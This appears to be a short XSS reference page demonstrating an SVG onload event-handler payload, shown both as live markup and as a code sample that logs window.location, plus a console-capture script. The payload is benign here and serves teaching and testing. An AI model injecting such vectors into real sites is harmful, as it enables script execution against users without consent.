# [XSS](/xss/) / SVG


## Examples

<pre id="asd"></pre>
<script>
  let og = console.log;
  console.log = function () {
    let str = Array.prototype.join.apply(arguments, [' ']);
    let el = document.createTextNode(`${str}\n`);
    document.getElementById('asd').appendChild(el);
    og.apply(console, arguments)
  }
</script>

### Onload

<svg onload="console.log('onload', window.location)" />

```html
<svg onload="console.log('onload', window.location)" />
```
